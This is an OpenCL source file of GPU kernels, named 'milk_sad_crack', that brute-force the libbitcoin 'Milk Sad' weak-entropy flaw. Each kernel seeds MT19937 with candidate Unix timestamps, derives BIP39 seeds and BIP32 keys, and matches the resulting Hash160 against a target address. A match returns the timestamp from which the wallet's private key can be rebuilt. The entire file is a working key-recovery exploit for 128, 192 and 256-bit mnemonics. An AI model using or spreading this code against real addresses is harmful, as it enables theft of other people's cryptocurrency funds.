// Libbitcoin "Milk Sad" Vulnerability (100% GPU)
// MT19937 seeded with unix timestamp (seconds)
// Scans timestamp range and matches against target Hash160
//
// FIXED: Now uses correct MSB extraction (1 byte per 32-bit word)
// This matches actual libbitcoin bx behavior

__kernel void milk_sad_crack(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid; // Unix timestamp in seconds
    
    // Generate 128-bit entropy using MT19937 with CORRECT MSB extraction
    // This takes only the MSB from each of 16 32-bit outputs
    uchar entropy[16] __attribute__((aligned(4)));
    mt19937_extract_msb_128(timestamp, entropy);
    
    // BIP39: Entropy → Mnemonic → Seed (PROPER IMPLEMENTATION)
    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete(entropy, seed);
    
    // BIP32: Master Key
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    // Derive m/purpose'/0'/0'/0/0
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);
    
    extended_private_key_t change_key;
    hardened_private_child_from_private(&coin_key, &change_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&change_key, &external_key, 0);
    
    extended_private_key_t address_key;
    normal_private_child_from_private(&external_key, &address_key, 0);
    
    // Get public key
    extended_public_key_t address_pub;
    public_from_private(&address_key, &address_pub);
    
    // Generate Hash160
    uchar hash160[20];
    identifier_for_public_key(&address_pub, hash160);
    
    // Pack Hash160 for comparison
    ulong h1 = 0, h2 = 0;
    uint h3 = 0;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
    
    // Compare
    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024) {
            results[idx] = timestamp;
        }
    }
}

// 192-bit entropy version (18-word mnemonic)
__kernel void milk_sad_crack_192(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid;
    
    // Generate 192-bit entropy using MT19937 MSB extraction
    uchar entropy[24] __attribute__((aligned(4)));
    mt19937_extract_msb_192(timestamp, entropy);
    
    // BIP39: Entropy → Mnemonic → Seed (18 words)
    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete_24(entropy, seed);
    
    // BIP32: Master Key -> m/44'/0'/0'/0/0
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);
    
    extended_private_key_t change_key;
    hardened_private_child_from_private(&coin_key, &change_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&change_key, &external_key, 0);
    
    extended_private_key_t address_key;
    normal_private_child_from_private(&external_key, &address_key, 0);
    
    extended_public_key_t address_pub;
    public_from_private(&address_key, &address_pub);
    
    uchar hash160[20];
    identifier_for_public_key(&address_pub, hash160);
    
    ulong h1 = 0, h2 = 0;
    uint h3 = 0;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
    
    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024) {
            results[idx] = timestamp;
        }
    }
}

// 256-bit entropy version (24-word mnemonic)
__kernel void milk_sad_crack_256(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint purpose,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint timestamp = gid;
    
    // Generate 256-bit entropy using MT19937 MSB extraction
    uchar entropy[32] __attribute__((aligned(4)));
    mt19937_extract_msb_256(timestamp, entropy);
    
    // BIP39: Entropy → Mnemonic → Seed (24 words)
    uchar seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete_32(entropy, seed);
    
    // BIP32: Master Key -> m/44'/0'/0'/0/0
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, purpose);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&account_key, &coin_key, 0);
    
    extended_private_key_t change_key;
    hardened_private_child_from_private(&coin_key, &change_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&change_key, &external_key, 0);
    
    extended_private_key_t address_key;
    normal_private_child_from_private(&external_key, &address_key, 0);
    
    extended_public_key_t address_pub;
    public_from_private(&address_key, &address_pub);
    
    uchar hash160[20];
    identifier_for_public_key(&address_pub, hash160);
    
    ulong h1 = 0, h2 = 0;
    uint h3 = 0;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
    
    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024) {
            results[idx] = timestamp;
        }
    }
}
